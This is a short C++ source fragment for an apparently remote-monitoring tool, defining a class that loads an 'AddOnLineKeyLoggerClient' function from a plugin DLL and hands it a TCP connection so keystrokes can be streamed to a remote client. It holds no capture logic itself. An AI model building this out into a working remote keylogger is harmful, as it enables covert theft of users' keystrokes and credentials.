

class COnlineKeyLoggerPlugin
{
	protected:
		static void *GetFunctionAddress(LPCSTR FunctionName);

	public:
		static bool AddKeyLoggerClient(CTcpNwMonitorConnection TcpConnection);
};

void *COnlineKeyLoggerPlugin::GetFunctionAddress(LPCSTR FunctionName)
{
	if(!GblStat_HModulePlugins_1_0) return 0;

	try
	{	
		return (void*)GetProcAddress(GblStat_HModulePlugins_1_0,FunctionName); 
	}
	catch(...) { return 0; }
}

bool COnlineKeyLoggerPlugin::AddKeyLoggerClient(CTcpNwMonitorConnection TcpConnection)
{
	MethodRetBoolArgCtcpconnection ProcID=(MethodRetBoolArgCtcpconnection)GetFunctionAddress("AddOnLineKeyLoggerClient");
	if(!ProcID) return false;
	try {  return ProcID(TcpConnection); } catch(...) { return false;}
}